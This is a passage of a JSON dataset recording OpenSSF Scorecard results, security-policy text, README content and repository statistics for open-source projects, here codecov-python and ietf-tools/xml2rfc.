                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-test.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/codecov/codecov-python/build-test.yml/master?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-test.yml:25: update your workflow using https://app.stepsecurity.io/secureworkflow/codecov/codecov-python/build-test.yml/master?enable=pin",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build-test.yml:30",
                        "Warn: pipCommand not pinned by hash: .github/workflows/build-test.yml:31",
                        "Info:   0 out of   2 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of   2 pipCommand dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 28 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/codecov/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/codecov/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/codecov/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/codecov/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Warn: no topLevel permission defined: .github/workflows/build-test.yml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/codecov/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Codecov Responsible Disclosure Policy\n\nData security is a top priority for Codecov, and Codecov believes that working with skilled security researchers can identify weaknesses in any technology.\n\nIf you believe you’ve found a security vulnerability in Codecov’s service, please notify us; we will work with you to resolve the issue promptly.\n\nEven though we don't have a bug bounty program, we will ensure that your findings gets passed along to the security team for remediation if you’ve found a security vulnerability in Codecov’s service.\n\n## Disclosure Policy\n\n- If you believe you’ve discovered a potential vulnerability, please let us know by emailing us at security@codecov.io . We will acknowledge your email within five business days.\n- Provide us with a reasonable amount of time to resolve the issue before disclosing it to the public or a third party. We aim to resolve critical issues within five business days of disclosure.\n- Make a good faith effort to avoid violating privacy, destroying data, or interrupting or degrading the Codecov service. Please only interact with accounts you own or for which you have explicit permission from the account holder.\n\n## Exclusions\n\nWhile researching, we’d like you to refrain from:\n\n- Distributed Denial of Service (DDoS)\n- Spamming\n- Social engineering or phishing of Codecov employees or contractors\n- Any attacks against Codecov’s physical property or data centers\n- Thank you for helping to keep Codecov and our users safe!\n\n## Changes\n\nWe may revise these guidelines from time to time. The most current version of the guidelines will be available at https://codecov.io/security\n\n## Contact\n\nCodecov is always open to feedback, questions, and suggestions. If you would like to talk to us, please feel free to email us at security@codecov.io, and our PGP key is at https://codecov.io/.well-known/security.txt.\n",
        "project_all_labels": [
            "bug",
            "dependencies",
            "duplicate",
            "enhancement",
            "hacktoberfest-accepted",
            "help wanted",
            "invalid",
            "patched & pending review",
            "question",
            "wontfix"
        ],
        "README_content": "🚨🚨 Deprecation Notice 🚨🚨\n\nThis uploader is being deprecated by the Codecov team. We recommend migrating to our [new uploader](https://docs.codecov.com/docs/codecov-uploader) as soon as possible to prevent any lapses in coverage. [The new uploader is open source](https://github.com/codecov/uploader), and we highly encourage submitting Issues and Pull Requests.\n\nYou can visit our [migration guide](https://docs.codecov.com/docs/deprecated-uploader-migration-guide#python-uploader) for help moving to our new uploader, and our blog post to learn more about our [deprecation plan](https://about.codecov.io/blog/codecov-uploader-deprecation-plan/)\n\n**On February 1, 2022 this uploader will be completely deprecated and will no longer be able to upload coverage to Codecov.**\n\n# Codecov Global Python Uploader\n\n[![codecov.io](https://codecov.io/github/codecov/codecov-python/coverage.svg?branch=master)](https://codecov.io/github/codecov/codecov-python)\n![PyPI](https://img.shields.io/pypi/v/codecov)\n[![Code style: black](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)\n[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fcodecov%2Fcodecov-python.svg?type=shield)](https://app.fossa.com/projects/git%2Bgithub.com%2Fcodecov%2Fcodecov-python?ref=badge_shield)\n=======\n| [Support][1] | [Documentation][2] | [Community Boards][3] | [Twitter][4] |\n| ------------ | ------------------ | --------------------- | ------------ |\n\nFind coverage reports for all the [languages below](#languages), gather them and submit them to Codecov.\n\n## Codecov Features\n- Reports are **automatically** combined with no extra setup. Each build is stored separately and combined.\n- Multiple languages are supported in a single upload and repository.\n- *Optionally* stores environment variables per build.\n\n\n## Usage\n\n```sh\npip install --user codecov && codecov -t <the-repository-upload-token>\n```\nor\n```sh\nconda install -c conda-forge codecov && codecov -t <the-repository-upload-token>\n```\n> `--user` argument not needed for Python projects. [See example here](https://github.com/codecov/example-python).\n\n## Languages\n> [Python](https://github.com/codecov/example-python), [C#/.net](https://github.com/codecov/example-csharp), [Java](https://github.com/codecov/example-java), [Node/Javascript/Coffee](https://github.com/codecov/example-node),\n> [C/C++](https://github.com/codecov/example-c), [D](https://github.com/codecov/example-d), [Go](https://github.com/codecov/example-go), [Groovy](https://github.com/codecov/example-groovy), [Kotlin](https://github.com/codecov/example-kotlin),\n> [PHP](https://github.com/codecov/example-php), [R](https://github.com/codecov/example-r), [Scala](https://github.com/codecov/example-scala), [Xtern](https://github.com/codecov/example-xtend), [Xcode](https://github.com/codecov/example-xcode), [Lua](https://github.com/codecov/example-lua) and more...\n\n## Using `tox`?\n\nCodecov can be set up in your `tox.ini`.\n\nJust please make sure to pass all the necessary environment variables through:\n\n```\n[testenv]\npassenv = TOXENV CI TRAVIS TRAVIS_* CODECOV_*\ndeps = codecov>=1.4.0\ncommands = codecov -e TOXENV\n```\n> See all the environment variables for other CI providers [here](https://github.com/codecov/codecov-python/blob/master/codecov/__init__.py#L254-L468)\n\n\n## Configuration\n\n> Below are the most commonly used settings.\n\n| Argument |   Environment   |                                                                    Description                                                                     |\n| -------- | --------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `-t`     | `CODECOV_TOKEN` | Private repo token for uploading                                                                                                                   |\n| `-e`     | `CODECOV_ENV`   | List of config vars to store for the build  |\n| `-F`     |      | Flag this upload to group coverage reports. Ex. `unittests` or `integration`  |\n\n```yaml\n# public repository on Travis CI\ninstall:\n  - pip install --user codecov\n# or\n  - conda install -c conda-forge codecov\nafter_success:\n  - codecov\n```\n\n```yaml\n# private repository on Travis CI\ninstall:\n  - pip install codecov\n# or\n  - conda install -c conda-forge codecov\nafter_success:\n  - codecov -t the-repository-upload-token\n```\n\n\n## CI Providers\n|                       Company                         |                                                                                     Supported                                                                                      |  Token Required  |\n| ----------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------- |\n| [AppVeyor](https://www.appveyor.com/)                 | Yes [![Build status](https://ci.appveyor.com/api/projects/status/sw18lsj7786bw806/branch/master?svg=true)](https://ci.appveyor.com/project/stevepeak/codecov-python/branch/master) | Private only     |\n| [Bamboo](https://www.atlassian.com/software/bamboo)   | `coming soon`                                                                                                                                                                      |                  |\n| [Buildbot](https://buildbot.net/)                     | `coming soon` [buildbot/buildbot#1671](https://github.com/buildbot/buildbot/pull/1671)                                                                                             |                  |\n| [CircleCI](https://circleci.com/)                     | Yes                                                                                                                                                                                | Private only     |\n| [Codeship](https://codeship.com/)                     | Yes                                                                                                                                                                                | Public & Private |\n| [Drone.io](https://drone.io/)                         | Yes                                                                                                                                                                                | Public & Private |\n| [GitHub Actions](https://github.com/features/actions) | Yes [![Build status](https://github.com/codecov/codecov-python/workflows/Python%20package/badge.svg?branch=master)](https://github.com/codecov/codecov-python/actions?query=workflow%3A%22Python+package%22)                                                                                        | Public & Private |\n| [Gitlab CI](https://about.gitlab.com/gitlab-ci/)      | Yes                                                                                                                                                                                | Public & Private |\n| [Jenkins](https://jenkins-ci.org/)                    | Yes                                                                                                                                                                                | Public & Private |\n| [Magnum CI](https://magnum-ci.com/)                   | Yes                                                                                                                                                                                | Public & Private |\n| [Semaphore](https://semaphoreci.com/)                 | Yes                                                                                                                                                                                | Public & Private |\n| [Shippable](https://www.shippable.com/)               | Yes                                                                                                                                                                                | Public & Private |\n| [Solano Labs](https://www.solanolabs.com/)            | `coming soon`                                                                                                                                                                      |                  |\n| [Travis CI](https://travis-ci.org/)                   | Yes [![Build Status](https://secure.travis-ci.org/codecov/codecov-python.svg?branch=master)](https://travis-ci.org/codecov/codecov-python)                                         | Private only     |\n| [Wercker](http://wercker.com/)                        | Yes                                                                                                                                                                                | Public & Private |\n| [Cirrus CI](https://cirrus-ci.org/)                   | Yes                                                                                                                                                                                | Private only     |\n| Git / Mercurial                                       | Yes (as a fallback)                                                                                                                                                                | Public & Private |\n\n\n## Troubleshooting\n\nIf you're seeing an **HTTP 400 error when uploading reports to S3**, make sure you've updated to at least version 2.1.3.\n\n\n\n[1]: https://codecov.io/support/\n[2]: https://docs.codecov.io/\n[3]: https://community.codecov.io/\n[4]: https://twitter.com/codecov\n\n## Copyright\n\n> Copyright 2014-2022 codecov\n\n\n## License\n[![FOSSA Status](https://app.fossa.com/api/projects/git%2Bgithub.com%2Fcodecov%2Fcodecov-python.svg?type=large)](https://app.fossa.com/projects/git%2Bgithub.com%2Fcodecov%2Fcodecov-python?ref=badge_large)\n",
        "num_commits": 669,
        "project_age_days": 3737,
        "project_created_at": "2014-08-06",
        "latest_updated_at": "2024-10-21",
        "latest_pushed_at": "2023-04-18",
        "num_contributors": 50,
        "num_pull": 185,
        "num_issues": 340,
        "num_opening_issue": 23,
        "project_size(kB)": 683,
        "num_stargazers": 185,
        "num_watchers": 185,
        "num_forks": 139,
        "num_subscribers": 21,
        "SecurityPolicy_created_at": "2022-08-18 14:27:11",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "e9302a976838072ff674754ad80a55a593b98917",
                "url": "https://github.com/codecov/.github/commit/e9302a976838072ff674754ad80a55a593b98917",
                "date": "2022-08-18 14:27:11"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism",
            "User guideline",
            "User guideline",
            "Information on maintainer"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "ietf-tools/xml2rfc",
        "project_url": "https://github.com/ietf-tools/xml2rfc",
        "SSF": {
            "date": "2024-10-30T01:16:10+07:00",
            "repo": {
                "name": "github.com/ietf-tools/xml2rfc",
                "commit": "f0aeb656770d7c26118dedb33d9dcbcc0e66b466"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 5.3,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: branch 'main' does not require approvers",
                        "Warn: codeowners review is not required on branch 'main'",
                        "Warn: no status checks found to merge onto branch 'main'"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "21 out of 21 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 7,
                    "reason": "Found 21/30 approved changesets -- score normalized to 7",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: mozilla contributor org/company found, greenbytes gmbh contributor org/company found, iot-dir contributor org/company found, ietf contributor org/company found, http2 contributor org/company found, web-push-libs contributor org/company found, sframe-wg contributor org/company found, core-wg contributor org/company found, ietf-tools contributor org/company found, requarks contributor org/company found, HTTPWorkshop contributor org/company found, ietf-wg-asdf contributor org/company found, fake-industries contributor org/company found, private-attribution contributor org/company found, dysfn contributor org/company found, unicorn-wg contributor org/company found, IETF-Hackathon contributor org/company found, ietf-wg-sedate contributor org/company found, ietf @ietf-tools @ietf- @requarks contributor org/company found, one-data-model contributor org/company found, ietf @ietf-tools @ietf- contributor org/company found, w3c contributor org/company found, quicwg contributor org/company found, mozilla-standards contributor org/company found, loops-wg contributor org/company found, roll-wg contributor org/company found, ietf-wg-jsonpath contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 27 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "19 commit(s) and 17 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/build-docker-images.yml:14"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/build-docker-images.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/build-docker-images.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build-docker-images.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/build-docker-images.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build-docker-images.yml:27: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/build-docker-images.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build-docker-images.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/build-docker-images.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build-docker-images.yml:37: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/build-docker-images.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/build-docker-images.yml:46: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/build-docker-images.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:21: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:24: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:29: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:42: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:45: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/checks.yml:51: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:109: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:112: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/checks.yml:118: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:170: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/checks.yml:173: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/checks.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-publish.yml:31: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/docs-publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-publish.yml:34: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/docs-publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-publish.yml:53: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/docs-publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/docs-publish.yml:61: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/docs-publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:23: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:30: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:44: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:75: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:98: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:106: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:114: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:127: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:133: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: GitHub-owned GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:144: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:147: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:150: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:153: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: third-party GitHubAction not pinned by hash: .github/workflows/pypi-publish.yml:160: update your workflow using https://app.stepsecurity.io/secureworkflow/ietf-tools/xml2rfc/pypi-publish.yml/main?enable=pin",
                        "Warn: containerImage not pinned by hash: docker/base.Dockerfile:1: pin your Docker image by updating ubuntu:jammy to ubuntu:jammy@sha256:0e5e4a57c2499249aafc3b40fcd541e9a456aab7296681a3994d631587203f97",
                        "Warn: containerImage not pinned by hash: docker/dev.Dockerfile:1: pin your Docker image by updating ghcr.io/ietf-tools/xml2rfc-base:latest to ghcr.io/ietf-tools/xml2rfc-base:latest@sha256:3fadd238e12f8eef4678326202ea33ca22799d9f42efdc1ab9acf5615cb68854",
                        "Warn: pipCommand not pinned by hash: docker/base.Dockerfile:50-53",
                        "Warn: pipCommand not pinned by hash: docker/base.Dockerfile:56-61",
                        "Warn: pipCommand not pinned by hash: docker/dev.Dockerfile:38-43",
                        "Warn: pipCommand not pinned by hash: .github/workflows/checks.yml:84",
                        "Warn: pipCommand not pinned by hash: .github/workflows/checks.yml:86",
                        "Warn: pipCommand not pinned by hash: .github/workflows/checks.yml:140",
                        "Warn: pipCommand not pinned by hash: .github/workflows/checks.yml:142",
                        "Warn: pipCommand not pinned by hash: .github/workflows/pypi-publish.yml:85",
                        "Info:   0 out of  17 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   0 out of  18 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   8 pipCommand dependencies pinned",
                        "Info:   0 out of   2 containerImage dependencies pinned"
                    ],
                    "score": 0,
                    "reason": "dependency not pinned by hash detected -- score normalized to 0",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Info: SAST configuration detected: CodeQL",
                        "Info: all commits (21) are checked with a SAST tool"
                    ],
                    "score": 10,
                    "reason": "SAST tool is run on all commits",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/ietf-tools/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/ietf-tools/.github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: github.com/ietf-tools/.github/SECURITY.md:1",
                        "Info: Found text in security policy: github.com/ietf-tools/.github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Warn: release artifact v3.24.0 not signed: https://api.github.com/repos/ietf-tools/xml2rfc/releases/182342707",
                        "Warn: release artifact v3.23.2 not signed: https://api.github.com/repos/ietf-tools/xml2rfc/releases/177701867",
                        "Warn: release artifact v3.23.1 not signed: https://api.github.com/repos/ietf-tools/xml2rfc/releases/175348157",
                        "Warn: release artifact v3.23.0 not signed: https://api.github.com/repos/ietf-tools/xml2rfc/releases/171358484",
                        "Warn: release artifact v3.22.0 not signed: https://api.github.com/repos/ietf-tools/xml2rfc/releases/163660061",
                        "Warn: release artifact v3.24.0 does not have provenance: https://api.github.com/repos/ietf-tools/xml2rfc/releases/182342707",
                        "Warn: release artifact v3.23.2 does not have provenance: https://api.github.com/repos/ietf-tools/xml2rfc/releases/177701867",
                        "Warn: release artifact v3.23.1 does not have provenance: https://api.github.com/repos/ietf-tools/xml2rfc/releases/175348157",
                        "Warn: release artifact v3.23.0 does not have provenance: https://api.github.com/repos/ietf-tools/xml2rfc/releases/171358484",
                        "Warn: release artifact v3.22.0 does not have provenance: https://api.github.com/repos/ietf-tools/xml2rfc/releases/163660061"
                    ],
                    "score": 0,
                    "reason": "Project has not signed or included provenance with any releases.",
                    "name": "Signed-Releases",
                    "documentation": {
